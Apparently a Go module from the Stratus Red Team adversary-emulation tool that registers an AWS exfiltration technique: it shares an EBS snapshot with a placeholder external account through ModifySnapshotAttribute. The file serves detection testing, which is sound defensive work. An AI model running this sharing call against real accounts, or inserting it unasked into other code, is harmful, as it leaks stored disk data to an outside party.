package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		Name:               "aws.exfiltration.ebs-snapshot-shared-with-external-account",
		Platform:           stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Exfiltrates an EBS snapshot by sharing it with an external AWS account.

Warm-up: Creates an EBS volume and a snapshot.
Detonation: Calls ModifySnapshotAttribute to share the snapshot.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.GetAWSProvider())

	// Find the snapshot to exfiltrate
	//ourSnapshotId, err := findSnapshotId(ec2Client)
	ourSnapshotId := params["snapshot_id"]

	// Exfiltrate it
	log.Println("Sharing the volume snapshot with an external AWS account ID...")

	_, err := ec2Client.ModifySnapshotAttribute(context.TODO(), &ec2.ModifySnapshotAttributeInput{
		SnapshotId: aws.String(ourSnapshotId),
		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
		CreateVolumePermission: &types.CreateVolumePermissionModifications{
			Add: []types.CreateVolumePermission{{UserId: aws.String("012345678912")}},
		},
	})
	return err
}

// retrieves the snapshot ID of the snapshot we want to exfiltrate
func findSnapshotId(ec2Client *ec2.Client) (string, error) {
	snapshots, err := ec2Client.DescribeSnapshots(context.Background(), &ec2.DescribeSnapshotsInput{
		Filters: []types.Filter{
			{Name: aws.String("tag:StratusRedTeam"), Values: []string{"true"}},
		},
	})
	if err != nil {
		return "", err
	}
	if len(snapshots.Snapshots) == 0 {
		return "", errors.New("no EBS snapshot to exfiltrate was found")
	}
	return *snapshots.Snapshots[0].SnapshotId, nil
}